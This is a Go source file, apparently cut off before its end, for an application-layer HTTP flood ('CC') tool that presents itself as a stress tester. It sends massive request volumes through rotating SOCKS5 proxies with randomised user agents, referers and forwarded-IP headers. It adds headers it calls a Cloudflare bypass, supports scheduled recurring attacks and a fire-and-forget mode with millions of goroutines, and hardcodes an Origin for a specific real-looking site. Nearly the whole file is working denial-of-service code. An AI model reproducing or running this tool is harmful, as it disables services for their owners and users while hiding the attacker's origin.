package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	fakeuseragent "github.com/EDDYCJY/fake-useragent"
	"golang.org/x/net/proxy"
)

// 配置结构
type Config struct {
	TargetURL         string
	Mode              string
	Threads           int
	RPS               int
	Duration          int
	Timeout           int
	ProxyFile         string
	CFBypass          bool
	RandomPath        bool
	RandomParams      bool
	Schedule          bool
	ScheduleInterval  int // 分钟
	ScheduleDuration  int // 分钟
	FireAndForget     bool // 火后不理模式，不接收响应
	CustomHeaders     map[string]string // 自定义请求头
}

// 统计信息
type Stats struct {
	TotalRequests   int64
	SuccessfulReqs  int64
	FailedReqs      int64
	CurrentRPS      float64
	AvgRPS          float64
	StartTime       time.Time
	LastStatsTime   time.Time
	LastTotalReqs   int64
	ErrorCodes      map[int]int64 // 错误码统计
	CORSErrors      int64         // CORS错误统计
	mu              sync.RWMutex
}

var stats = &Stats{
	StartTime:     time.Now(),
	LastStatsTime: time.Now(),
	ErrorCodes:    make(map[int]int64),
}

// 代理列表
var proxies []string

func main() {
	fmt.Printf("🎯 CC压力测试工具启动中...\n")
	
	rand.Seed(time.Now().UnixNano())

	// 解析命令行参数
	config := parseArgs()
	
	// 显示使用帮助
	fmt.Printf("\n💡 使用提示:\n")
	fmt.Printf("  - 普通模式: ./cc-main -url https://example.com\n")
	fmt.Printf("  - 定时任务: ./cc-main -url https://example.com -schedule -schedule-interval 10 -schedule-duration 5\n")
	fmt.Printf("  - 测试模式: ./cc-main -url https://example.com -test-schedule\n")
	fmt.Printf("  - 立即执行: ./cc-main -url https://example.com -immediate\n")
	fmt.Printf("  - 快速测试: ./cc-main -url https://example.com -quick-test\n")
	fmt.Printf("\n")

	// 加载代理
	loadProxies(config.ProxyFile)
	fmt.Printf("🔗 已加载 %d 个代理\n", len(proxies))

	// 启动统计协程
	go statsReporter()

	// 显示最终配置
	fmt.Printf("\n📋 最终配置:\n")
	fmt.Printf("  URL: %s\n", config.TargetURL)
	fmt.Printf("  模式: %s\n", config.Mode)
	fmt.Printf("  线程数: %d\n", config.Threads)
	fmt.Printf("  RPS: %d\n", config.RPS)
	fmt.Printf("  持续时间: %d秒\n", config.Duration)
	fmt.Printf("  定时任务: %t\n", config.Schedule)
	if config.Schedule {
		fmt.Printf("  定时间隔: %d分钟\n", config.ScheduleInterval)
		fmt.Printf("  执行时长: %d分钟\n", config.ScheduleDuration)
	}
	fmt.Printf("  CF绕过: %t\n", config.CFBypass)
	fmt.Printf("  火后不理: %t\n", config.FireAndForget)
	fmt.Printf("\n")

	// 启动攻击
	if config.Schedule {
		fmt.Printf("🕐 定时任务模式已启用\n")
		startScheduledAttack(config)
	} else {
		fmt.Printf("🚀 立即执行模式\n")
		startAttack(config)
	}
}

func parseArgs() *Config {
	config := &Config{
		TargetURL:        "https://example.com",
		Mode:             "post",
		Threads:          100,
		RPS:              1000,
		Duration:         60,
		Timeout:          10,
		ProxyFile:        "socks5.txt",
		CFBypass:         true,
		RandomPath:       false, // 已禁用，避免404错误
		RandomParams:     false, // 已禁用，不再添加随机查询参数
		Schedule:         false,
		ScheduleInterval: 10,
		ScheduleDuration: 20,
		FireAndForget:    false, // 默认关闭火后不理模式
	}

	flag.StringVar(&config.TargetURL, "url", config.TargetURL, "目标URL")
	flag.StringVar(&config.Mode, "mode", config.Mode, "攻击模式 (get/post/head)")
	flag.IntVar(&config.Threads, "threads", config.Threads, "线程数")
	flag.IntVar(&config.RPS, "rps", config.RPS, "每秒请求数")
	flag.IntVar(&config.Duration, "duration", config.Duration, "持续时间(秒)")
	flag.IntVar(&config.Timeout, "timeout", config.Timeout, "超时时间(秒)")
	flag.StringVar(&config.ProxyFile, "proxy-file", config.ProxyFile, "SOCKS5代理文件")
	flag.BoolVar(&config.CFBypass, "cf-bypass", config.CFBypass, "启用CF绕过")
	flag.BoolVar(&config.RandomParams, "random-params", config.RandomParams, "随机参数（已禁用，仅对文件路径添加随机数）")
	flag.BoolVar(&config.Schedule, "schedule", config.Schedule, "启用定时执行")
	flag.IntVar(&config.ScheduleInterval, "schedule-interval", config.ScheduleInterval, "定时执行间隔（分钟）")
	flag.IntVar(&config.ScheduleDuration, "schedule-duration", config.ScheduleDuration, "每次执行时长（分钟）")
	
	// 测试模式：短间隔定时任务
	var testMode bool
	flag.BoolVar(&testMode, "test-schedule", false, "测试模式：每30秒执行一次，每次10秒")
	flag.BoolVar(&config.RandomPath, "random-path", config.RandomPath, "随机路径")
	flag.BoolVar(&config.FireAndForget, "fire-and-forget", config.FireAndForget, "火后不理模式，不接收响应数据，极速模式")
	flag.Parse()

	// 测试模式配置
	if testMode {
		fmt.Printf("🧪 测试模式已启用\n")
		config.Schedule = true
		config.ScheduleInterval = 1 // 1分钟间隔
		config.ScheduleDuration = 1 // 1分钟执行
		fmt.Printf("📝 测试配置: 每%d分钟执行一次，每次%d分钟\n", config.ScheduleInterval, config.ScheduleDuration)
	}
	
	// 添加快速测试模式
	var quickTest bool
	flag.BoolVar(&quickTest, "quick-test", false, "快速测试：每10秒执行一次，每次5秒")
	if quickTest {
		fmt.Printf("⚡ 快速测试模式已启用\n")
		config.Schedule = true
		config.ScheduleInterval = 1 // 1分钟间隔（最小）
		config.ScheduleDuration = 1 // 1分钟执行（最小）
		fmt.Printf("📝 快速测试配置: 每%d分钟执行一次，每次%d分钟\n", config.ScheduleInterval, config.ScheduleDuration)
	}
	
	// 添加立即执行选项
	var immediate bool
	flag.BoolVar(&immediate, "immediate", false, "立即执行一次攻击（用于测试）")
	if immediate {
		fmt.Printf("⚡ 立即执行模式已启用\n")
		config.Schedule = false
		config.Duration = 10 // 10秒测试
		fmt.Printf("📝 立即执行配置: 持续%d秒\n", config.Duration)
	}

	// 基本校验
	if strings.TrimSpace(config.TargetURL) == "" {
		os.Exit(1)
	}

	// 如果还传了位置参数且必要，可处理（保持向后兼容）
	args := flag.Args()
	if len(args) >= 4 && config.TargetURL == "" {
		config.Mode = args[0]
		config.TargetURL = args[1]
		if t, err := strconv.Atoi(args[2]); err == nil {
			config.Threads = t
		}
		if r, err := strconv.Atoi(args[3]); err == nil {
			config.RPS = r
		}
	}

	return config
}

func loadProxies(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}

	fmt.Printf("✅ 代理加载完成\n")
}

func startAttack(config *Config) {
	// 防止 RPS 为 0 导致 panic
	if config.RPS <= 0 {
		return
	}

	fmt.Printf("🎯 开始攻击，目标RPS: %d\n", config.RPS)
	
	// 计算每个线程应该处理的RPS
	threads := config.Threads
	if threads <= 0 {
		threads = 1
	}
	
	// 确保线程数足够支持目标RPS
	// 每个线程最多处理100 RPS，所以需要 config.RPS/100 个线程
	minThreads := (config.RPS + 99) / 100 // 向上取整
	if threads < minThreads {
		oldThreads := threads
		threads = minThreads
		fmt.Printf("⚠️  调整线程数从 %d 到 %d 以支持RPS %d (每线程最多100 RPS)\n", oldThreads, threads, config.RPS)
	}
	
	// 计算每个线程的RPS
	rpsPerThread := config.RPS / threads
	if rpsPerThread <= 0 {
		rpsPerThread = 1
	}
	
	fmt.Printf("📊 配置: %d个线程，每线程RPS: %d\n", threads, rpsPerThread)

	done := make(chan struct{})
	var wg sync.WaitGroup
	
	// 为每个线程创建独立的rate limiter
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()
			workerWithRateLimit(config, rpsPerThread, done, threadID)
		}(i)
	}

	time.Sleep(time.Duration(config.Duration) * time.Second)

	fmt.Println("\n⏰ 攻击时间结束，等待所有请求完成...")
	close(done)
	wg.Wait()

	printFinalStats()
}

func startScheduledAttack(config *Config) {
	if config.ScheduleInterval <= 0 {
		fmt.Printf("❌ 定时攻击间隔无效: %d分钟\n", config.ScheduleInterval)
		return
	}
	
	fmt.Printf("🕐 启动定时攻击模式: 每%d分钟执行一次，每次%d分钟\n", config.ScheduleInterval, config.ScheduleDuration)
	fmt.Printf("📅 下次执行时间: %s\n", time.Now().Add(time.Duration(config.ScheduleInterval)*time.Minute).Format("2006-01-02 15:04:05"))
	
	// 创建定时器
	interval := time.Duration(config.ScheduleInterval) * time.Minute
	fmt.Printf("⏰ 定时器间隔: %v\n", interval)
	
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	// 立即执行第一次攻击
	fmt.Printf("🚀 立即执行第一次攻击...\n")
	go executeAttack(config, config.ScheduleDuration)
	
	// 然后等待定时器触发
	fmt.Printf("⏳ 等待第一次定时器触发...\n")
	firstTrigger := <-ticker.C
	fmt.Printf("🔔 第一次定时器触发: %s\n", firstTrigger.Format("2006-01-02 15:04:05"))
	
	attackCount := 0
	for {
		attackCount++
		fmt.Printf("\n🚀 [第%d次] 定时攻击开始执行 - %s\n", attackCount, time.Now().Format("2006-01-02 15:04:05"))
		
		// 在goroutine中执行攻击，避免阻塞定时器
		go executeAttack(config, config.ScheduleDuration)
		
		fmt.Printf("⏳ 等待下次执行时间: %s\n", time.Now().Add(time.Duration(config.ScheduleInterval)*time.Minute).Format("2006-01-02 15:04:05"))
		nextTrigger := <-ticker.C
		fmt.Printf("🔔 定时器触发: %s\n", nextTrigger.Format("2006-01-02 15:04:05"))
	}
}

func executeAttack(config *Config, durationMinutes int) {
	if config.RPS <= 0 {
		fmt.Printf("❌ RPS配置无效: %d\n", config.RPS)
		return
	}
	
	fmt.Printf("🎯 执行攻击任务开始\n")
	fmt.Printf("📍 目标URL: %s\n", config.TargetURL)
	fmt.Printf("⚙️  攻击模式: %s\n", strings.ToUpper(config.Mode))
	fmt.Printf("🧵 线程数: %d\n", config.Threads)
	fmt.Printf("⚡ RPS: %d\n", config.RPS)
	fmt.Printf("⏱️  持续时间: %d分钟\n", durationMinutes)
	fmt.Printf("🛡️  CF绕过: %t\n", config.CFBypass)
	fmt.Printf("🎲 随机路径: %t\n", config.RandomPath)
	fmt.Printf("🎲 随机参数: %t\n", config.RandomParams)
	if config.FireAndForget {
		fmt.Printf("🔥 火后不理模式: 启用\n")
	}
	
	// 高并发配置，支持亿万级并发
	threads := config.Threads
	if config.FireAndForget {
		// 火后不理模式：支持亿万级并发
		if threads < 100000 {
			threads = 100000 // 最小10万个线程
		}
		if threads > 10000000 {
			threads = 10000000 // 最大1000万个线程
		}
	} else {
		// 普通模式
		if threads < 1000 {
			threads = 1000 // 最小1000个线程
		}
		if threads > 50000 {
			threads = 50000 // 最大50000个线程
		}
	}
	
	// 计算每个线程的RPS
	rpsPerThread := config.RPS / threads
	if rpsPerThread <= 0 {
		rpsPerThread = 1
	}
	
	fmt.Printf("📊 高并发配置: %d个线程，每线程RPS: %d\n", threads, rpsPerThread)

	done := make(chan struct{})
	var wg sync.WaitGroup
	
	// 启动大量worker goroutines
	fmt.Printf("🔄 启动 %d 个worker线程...\n", threads)
	for i := 0; i < threads; i++ {
		wg.Add(1)
		if config.FireAndForget {
			go func(threadID int) {
				defer wg.Done()
				fireAndForgetWorkerWithRateLimit(config, rpsPerThread, done, threadID)
			}(i)
		} else {
			go func(threadID int) {
				defer wg.Done()
				highConcurrencyWorkerWithRateLimit(config, rpsPerThread, done, threadID)
			}(i)
		}
	}

	duration := time.Duration(durationMinutes) * time.Minute
	fmt.Printf("⏱️ 攻击将持续 %d 分钟 (预计结束时间: %s)...\n", durationMinutes, time.Now().Add(duration).Format("2006-01-02 15:04:05"))
	
	// 每30秒输出一次进度
	startTime := time.Now()
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				elapsed := time.Since(startTime)
				remaining := duration - elapsed
				if remaining > 0 {
					fmt.Printf("📊 攻击进行中... 已运行: %v, 剩余: %v\n", elapsed.Round(time.Second), remaining.Round(time.Second))
				}
			case <-done:
				return
			}
		}
	}()
	
	time.Sleep(duration)

	fmt.Printf("🛑 攻击时间结束，正在停止所有worker线程...\n")
	close(done)
	wg.Wait()

	fmt.Printf("✅ 攻击任务完成 (总耗时: %v)\n", time.Since(startTime))
	printFinalStats()
}

// 火后不理worker，不接收响应数据，极速模式
func fireAndForgetWorker(config *Config, semaphore <-chan struct{}, done <-chan struct{}) {
	for {
		select {
		case <-semaphore:
			// 火后不理模式：只发送请求，不等待响应
			go func() {
				statusCode := performFireAndForgetAttack(config)
				atomic.AddInt64(&stats.TotalRequests, 1)
				
				// 统计错误码
				stats.mu.Lock()
				stats.ErrorCodes[statusCode]++
				stats.mu.Unlock()
				
				if statusCode >= 200 && statusCode < 400 {
					atomic.AddInt64(&stats.SuccessfulReqs, 1)
				} else {
					atomic.AddInt64(&stats.FailedReqs, 1)
				}
			}()
		case <-done:
			return
		}
	}
}

// 高并发worker，使用信号量控制
func highConcurrencyWorker(config *Config, semaphore <-chan struct{}, done <-chan struct{}) {
	for {
		select {
		case <-semaphore:
			statusCode := performAttack(config)
			atomic.AddInt64(&stats.TotalRequests, 1)
			
			// 统计错误码
			stats.mu.Lock()
			stats.ErrorCodes[statusCode]++
			stats.mu.Unlock()
			
			if statusCode >= 200 && statusCode < 400 {
				atomic.AddInt64(&stats.SuccessfulReqs, 1)
			} else {
				atomic.AddInt64(&stats.FailedReqs, 1)
			}
		case <-done:
			return
		}
	}
}

// 保留原worker函数以兼容
func worker(config *Config, rateLimit <-chan time.Time, done <-chan struct{}) {
	for {
		select {
		case <-rateLimit:
			statusCode := performAttack(config)
			atomic.AddInt64(&stats.TotalRequests, 1)
			
			// 统计错误码
			stats.mu.Lock()
			stats.ErrorCodes[statusCode]++
			stats.mu.Unlock()
			
			if statusCode >= 200 && statusCode < 400 {
				atomic.AddInt64(&stats.SuccessfulReqs, 1)
			} else {
				atomic.AddInt64(&stats.FailedReqs, 1)
			}
		case <-done:
			return
		}
	}
}

// 带速率限制的worker函数
func workerWithRateLimit(config *Config, rpsPerThread int, done <-chan struct{}, threadID int) {
	// 为每个线程创建独立的rate limiter
	interval := time.Second / time.Duration(rpsPerThread)
	if interval <= 0 {
		interval = time.Nanosecond
	}
	
	rateLimiter := time.NewTicker(interval)
	defer rateLimiter.Stop()
	
	requestCount := 0
	startTime := time.Now()
	
	for {
		select {
		case <-rateLimiter.C:
			statusCode := performAttack(config)
			atomic.AddInt64(&stats.TotalRequests, 1)
			requestCount++
			
			// 每100个请求输出一次线程状态
			if requestCount%100 == 0 {
				elapsed := time.Since(startTime)
				actualRPS := float64(requestCount) / elapsed.Seconds()
				fmt.Printf("🧵 线程%d: 已发送%d个请求, 实际RPS: %.2f\n", threadID, requestCount, actualRPS)
			}
			
			// 统计错误码
			stats.mu.Lock()
			stats.ErrorCodes[statusCode]++
			stats.mu.Unlock()
			
			if statusCode >= 200 && statusCode < 400 {
				atomic.AddInt64(&stats.SuccessfulReqs, 1)
			} else {
				atomic.AddInt64(&stats.FailedReqs, 1)
			}
		case <-done:
			elapsed := time.Since(startTime)
			actualRPS := float64(requestCount) / elapsed.Seconds()
			fmt.Printf("🏁 线程%d完成: 总请求%d, 实际RPS: %.2f\n", threadID, requestCount, actualRPS)
			return
		}
	}
}

// 火后不理攻击函数，不接收响应数据但统计错误
func performFireAndForgetAttack(config *Config) int {
	if config.TargetURL == "" {
		return 0
	}

	baseURL, err := url.Parse(config.TargetURL)
	if err != nil {
		return 0
	}

	var client *http.Client
	if len(proxies) > 0 {
		px := proxies[rand.Intn(len(proxies))]
		client = createSOCKS5Client(px, config.Timeout)
	} else {
		client = createDirectClient(config.Timeout)
	}

	finalURL := buildFinalURL(baseURL, config)

	var req *http.Request
	switch strings.ToLower(config.Mode) {
	case "get":
		req, err = http.NewRequest("GET", finalURL, nil)
	case "post":
		req, err = http.NewRequest("POST", finalURL, nil)
	case "head":
		req, err = http.NewRequest("HEAD", finalURL, nil)
	default:
		req, err = http.NewRequest("GET", finalURL, nil)
	}
	if err != nil {
		return 0
	}

	setAdvancedHeaders(req, config)

	// 火后不理模式：异步发送请求并统计错误
	go func() {
		resp, err := client.Do(req)
		statusCode := 0
		
		if err != nil {
			// 网络错误
			statusCode = -1
		} else if resp != nil {
			statusCode = resp.StatusCode
			// 快速关闭连接，不读取响应体
			if resp.Body != nil {
				resp.Body.Close()
			}
		} else {
			// 无响应
			statusCode = -2
		}
		
		// 统计错误码
		stats.mu.Lock()
		stats.ErrorCodes[statusCode]++
		stats.mu.Unlock()
		
		// 更新成功/失败统计
		if statusCode >= 200 && statusCode < 400 {
			atomic.AddInt64(&stats.SuccessfulReqs, 1)
		} else {
			atomic.AddInt64(&stats.FailedReqs, 1)
		}
	}()

	// 立即返回，不等待响应
	return 200
}

func performAttack(config *Config) int {
	if config.TargetURL == "" {
		return 0
	}

	baseURL, err := url.Parse(config.TargetURL)
	if err != nil {
		return 0
	}

	var client *http.Client
	if len(proxies) > 0 {
		px := proxies[rand.Intn(len(proxies))]
		client = createSOCKS5Client(px, config.Timeout)
	} else {
		client = createDirectClient(config.Timeout)
	}

	finalURL := buildFinalURL(baseURL, config)

	var req *http.Request
	switch strings.ToLower(config.Mode) {
	case "get":
		req, err = http.NewRequest("GET", finalURL, nil)
	case "post":
		req, err = http.NewRequest("POST", finalURL, strings.NewReader("{}"))
	case "head":
		req, err = http.NewRequest("HEAD", finalURL, nil)
	default:
		req, err = http.NewRequest("GET", finalURL, nil)
	}
	if err != nil {
		return 0
	}

	setAdvancedHeaders(req, config)

	resp, err := client.Do(req)
	if err != nil {
		// 代理失败直接返回错误，不尝试直连
		return 0
	}
	defer func() {
		if resp != nil && resp.Body != nil {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}()

	if resp == nil {
		return 0
	}

	// 检测CORS错误 - 只有成功响应才不算CORS错误
	if resp.StatusCode >= 200 && resp.StatusCode < 400 {
		// 成功响应，检查是否有CORS头
		corsHeaders := []string{"Access-Control-Allow-Origin", "Access-Control-Allow-Credentials", "Access-Control-Allow-Methods"}
		hasCORSHeaders := false
		for _, header := range corsHeaders {
			if resp.Header.Get(header) != "" {
				hasCORSHeaders = true
				break
			}
		}
		
		// 成功响应但没有CORS头，说明可能被CORS策略阻止了
		if !hasCORSHeaders {
			atomic.AddInt64(&stats.CORSErrors, 1)
		}
	} else {
		// 失败响应直接算作CORS错误
		atomic.AddInt64(&stats.CORSErrors, 1)
	}

	// 统计已在worker中处理，这里不需要重复计算

	return resp.StatusCode
}

func createSOCKS5Client(proxyAddr string, timeout int) *http.Client {
	// 支持两种代理行格式：host:port 或 socks5://host:port
	parsed := proxyAddr
	if strings.HasPrefix(proxyAddr, "socks5://") {
		parsed = strings.TrimPrefix(proxyAddr, "socks5://")
	}
	// x/net/proxy 的 SOCKS5 dialer
	dialer, err := proxy.SOCKS5("tcp", parsed, nil, proxy.Direct)
	if err != nil {
		// 无法创建 socks5 dialer -> 回退直连
		return createDirectClient(timeout)
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		// 高并发优化：启用连接复用
		DisableKeepAlives:   false,
		MaxIdleConns:        10000,       // 增加最大空闲连接数
		MaxIdleConnsPerHost: 1000,        // 每个主机最大空闲连接数
		IdleConnTimeout:     30 * time.Second,
		MaxConnsPerHost:     10000,       // 每个主机最大连接数
		// 启用HTTP/2
		ForceAttemptHTTP2: true,
	}

	// 将无上下文 dialer 包装为 DialContext
	transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		// dialer.Dial 没有 context，所以忽略 ctx
		return dialer.Dial(network, addr)
	}

	return &http.Client{
		Transport: transport,
		Timeout:   time.Duration(timeout) * time.Second,
	}
}

func createDirectClient(timeout int) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		// 高并发优化：启用连接复用
		DisableKeepAlives:   false,
		MaxIdleConns:        10000,       // 增加最大空闲连接数
		MaxIdleConnsPerHost: 1000,        // 每个主机最大空闲连接数
		IdleConnTimeout:     30 * time.Second,
		MaxConnsPerHost:     10000,       // 每个主机最大连接数
		// 优化连接建立
		DialContext: (&net.Dialer{
			Timeout:   1 * time.Second,   // 减少连接超时
			KeepAlive: 30 * time.Second,
		}).DialContext,
		// 启用HTTP/2
		ForceAttemptHTTP2: true,
	}
	return &http.Client{
		Transport: transport,
		Timeout:   time.Duration(timeout) * time.Second,
	}
}

func buildFinalURL(baseURL *url.URL, config *Config) string {
	finalURL := *baseURL

	if config.RandomPath {
		finalURL.Path = generateRandomPathForFile(finalURL.Path)
	}

	// 不再添加随机查询参数，只对文件路径添加随机数
	// if config.RandomParams {
	//	finalURL.RawQuery = generateRandomParams()
	// }

	return finalURL.String()
}

func setAdvancedHeaders(req *http.Request, config *Config) {
	userAgent := fakeuseragent.Random()
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Referer", generateRandomReferer())
	
	// 为 POST 请求设置 Content-Type
	if strings.ToLower(config.Mode) == "post" {
		req.Header.Set("Content-Type", "application/json")
	}
	
	// 设置CORS相关请求头
	req.Header.Set("Origin", "https://www.cryptunex.ai")
	req.Header.Set("Access-Control-Request-Method", strings.ToUpper(config.Mode))
	req.Header.Set("Access-Control-Request-Headers", "content-type,authorization")
	
	// 设置自定义请求头
	if config.CustomHeaders != nil {
		for key, value := range config.CustomHeaders {
			req.Header.Set(key, value)
		}
	}
	
	generateRandomHeaders(req, config)

	if config.CFBypass {
		req.Header.Set("CF-IPCountry", "US")
		req.Header.Set("CF-Ray", generateCFRay())
		req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
	}
}

func generateCFRay() string {
	chars := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 16)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func generateRandomPathForFile(originalPath string) string {
	if originalPath == "" {
		originalPath = "/"
	}
	if strings.Contains(originalPath, ".") && !strings.HasSuffix(originalPath, "/") {
		lastDot := strings.LastIndex(originalPath, ".")
		if lastDot > 0 {
			baseName := originalPath[:lastDot]
			extension := originalPath[lastDot:]
			randomNum := rand.Intn(10000)
			return fmt.Sprintf("%s_%d%s", baseName, randomNum, extension)
		}
	}
	randomNum := rand.Intn(10000)
	if originalPath == "/" {
		return fmt.Sprintf("/%d", randomNum)
	}
	return fmt.Sprintf("%s/%d", originalPath, randomNum)
}

func generateRandomParams() string {
	params := []string{
		"t=" + strconv.FormatInt(time.Now().Unix(), 10),
		"_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"v=" + strconv.Itoa(rand.Intn(100)),
		"ref=" + []string{"google", "bing", "yahoo", "direct"}[rand.Intn(4)],
		"utm_source=" + []string{"google", "facebook", "twitter", "email"}[rand.Intn(4)],
		"utm_medium=" + []string{"cpc", "cpm", "organic", "social"}[rand.Intn(4)],
		"utm_campaign=" + generateRandomString(8),
		"session_id=" + generateRandomString(32),
		"user_id=" + strconv.Itoa(rand.Intn(10000)),
		"page=" + strconv.Itoa(rand.Intn(100)),
	}

	numParams := rand.Intn(5) + 3
	selected := make([]string, 0, numParams)
	for i := 0; i < numParams; i++ {
		selected = append(selected, params[rand.Intn(len(params))])
	}
	return strings.Join(selected, "&")
}

func generateRandomString(length int) string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func generateRandomReferer() string {
	domains := []string{
		"google.com", "bing.com", "yahoo.com", "duckduckgo.com",
		"baidu.com", "sogou.com", "so.com", "360.cn",
		"facebook.com", "twitter.com", "instagram.com", "youtube.com",
		"reddit.com", "github.com", "stackoverflow.com", "amazon.com",
	}
	paths := []string{"/", "/search?q=", "/home", "/about", "/contact", "/blog", "/news", "/api"}
	domain := domains[rand.Intn(len(domains))]
	path := paths[rand.Intn(len(paths))]
	// 随机添加查询参数
	if strings.Contains(path, "?") {
		paramKey := []string{"q", "search", "s"}[rand.Intn(3)]
		path += paramKey + "=" + generateRandomString(6+rand.Intn(8))
	}
	if rand.Float32() < 0.3 {
		path += "&utm=" + generateRandomString(6)
	}
	return "https://www." + domain + path
}

func generateRandomHeaders(req *http.Request, config *Config) {
	headerCount := rand.Intn(11) + 5
	selected := make(map[string]bool)

	headerTypes := []string{
		"Accept", "Accept-Language", "Accept-Encoding", "Cache-Control", "Connection",
		"Upgrade-Insecure-Requests", "Sec-Fetch-Dest", "Sec-Fetch-Mode", "Sec-Fetch-Site", "Sec-Fetch-User",
	}
	for i := 0; i < headerCount; i++ {
		ht := headerTypes[rand.Intn(len(headerTypes))]
		selected[ht] = true
	}

	accepts := []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	}
	languages := []string{"en-US,en;q=0.9", "zh-CN,zh;q=0.9,en;q=0.8", "en-GB,en;q=0.9"}
	encodings := []string{"gzip, deflate, br", "gzip, deflate", "gzip"}
	cacheControls := []string{"no-cache", "max-age=0", "no-store, no-cache, must-revalidate"}

	if selected["Accept"] {
		req.Header.Set("Accept", accepts[rand.Intn(len(accepts))])
	}
	if selected["Accept-Language"] {
		req.Header.Set("Accept-Language", languages[rand.Intn(len(languages))])
	}
	if selected["Accept-Encoding"] {
		req.Header.Set("Accept-Encoding", encodings[rand.Intn(len(encodings))])
	}
	if selected["Cache-Control"] {
		req.Header.Set("Cache-Control", cacheControls[rand.Intn(len(cacheControls))])
	}

	if rand.Float32() < 0.7 {
		req.Header.Set("Pragma", "no-cache")
	}
	chromeVersions := []string{"120", "119", "121", "118", "117"}
	version := chromeVersions[rand.Intn(len(chromeVersions))]
	req.Header.Set("Sec-Ch-Ua", fmt.Sprintf("\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"%s\", \"Google Chrome\";v=\"%s\"", version, version))
	req.Header.Set("Sec-Ch-Ua-Mobile", []string{"?0", "?1"}[rand.Intn(2)])
	platforms := []string{"Windows", "macOS", "Linux", "Android", "iOS"}
	req.Header.Set("Sec-Ch-Ua-Platform", fmt.Sprintf("\"%s\"", platforms[rand.Intn(len(platforms))]))

	secFetchDests := []string{"document", "empty", "image", "script"}
	req.Header.Set("Sec-Fetch-Dest", secFetchDests[rand.Intn(len(secFetchDests))])
	secFetchModes := []string{"navigate", "cors", "no-cors", "same-origin"}
	req.Header.Set("Sec-Fetch-Mode", secFetchModes[rand.Intn(len(secFetchModes))])
	secFetchSites := []string{"none", "same-origin", "cross-site"}
	req.Header.Set("Sec-Fetch-Site", secFetchSites[rand.Intn(len(secFetchSites))])
	req.Header.Set("Sec-Fetch-User", []string{"?1", "?0"}[rand.Intn(2)])

	if rand.Float32() < 0.8 {
		req.Header.Set("Upgrade-Insecure-Requests", "1")
	}
	if rand.Float32() < 0.6 {
		req.Header.Set("DNT", []string{"1", "0"}[rand.Intn(2)])
	}
	req.Header.Set("Connection", []string{"keep-alive", "close"}[rand.Intn(2)])

	extraHeaders := []string{
		"X-Requested-With", "X-Forwarded-For", "X-Real-IP", "X-Forwarded-Proto",
		"X-Request-ID", "X-Correlation-ID", "X-Client-IP", "X-Remote-IP",
	}
	for i := 0; i < rand.Intn(5); i++ {
		h := extraHeaders[rand.Intn(len(extraHeaders))]
		if !selected[h] {
			req.Header.Set(h, generateRandomString(8+rand.Intn(12)))
			selected[h] = true
		}
	}
}

func statsReporter() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		stats.mu.Lock()
		now := time.Now()

		timeDiff := now.Sub(stats.LastStatsTime).Seconds()
		if timeDiff >= 0.0001 {
			currentRPS := float64(stats.TotalRequests-stats.LastTotalReqs) / timeDiff
			stats.CurrentRPS = currentRPS
			stats.LastTotalReqs = stats.TotalRequests
			stats.LastStatsTime = now
		}

		uptime := now.Sub(stats.StartTime).Seconds()
		if uptime > 0 {
			stats.AvgRPS = float64(stats.TotalRequests) / uptime
		}

		// 输出实时统计信息
		fmt.Printf("📊 实时统计: 总请求=%d, 成功=%d, 失败=%d, 当前RPS=%.2f, 平均RPS=%.2f, 运行时间=%.2fs, CORS错误=%d\n", 
			stats.TotalRequests, stats.SuccessfulReqs, stats.FailedReqs, stats.CurrentRPS, stats.AvgRPS, uptime, stats.CORSErrors)
		fmt.Printf("STATS_JSON:{\"total_requests\":%d,\"successful_reqs\":%d,\"failed_reqs\":%d,\"current_rps\":%.2f,\"avg_rps\":%.2f,\"uptime\":%.2f,\"cors_errors\":%d}\n", 
			stats.TotalRequests, stats.SuccessfulReqs, stats.FailedReqs, stats.CurrentRPS, stats.AvgRPS, uptime, stats.CORSErrors)

		// 向API服务器发送CORS错误统计
		go updateAPICORSErrors(stats.CORSErrors)

		stats.mu.Unlock()
	}
}

func printFinalStats() {
	stats.mu.RLock()
	defer stats.mu.RUnlock()

	uptime := time.Since(stats.StartTime).Seconds()
	total := stats.TotalRequests
	success := stats.SuccessfulReqs
	fail := stats.FailedReqs
	avgRPS := stats.AvgRPS

	fmt.Printf("\n\n🎯 攻击完成！\n")
	fmt.Printf("总请求数: %d\n", total)
	fmt.Printf("成功请求: %d\n", success)
	fmt.Printf("失败请求: %d\n", fail)
	fmt.Printf("CORS错误: %d\n", stats.CORSErrors)
	fmt.Printf("平均RPS: %.2f\n", avgRPS)
	fmt.Printf("运行时间: %.2f秒\n", uptime)
	
	// 输出详细错误统计
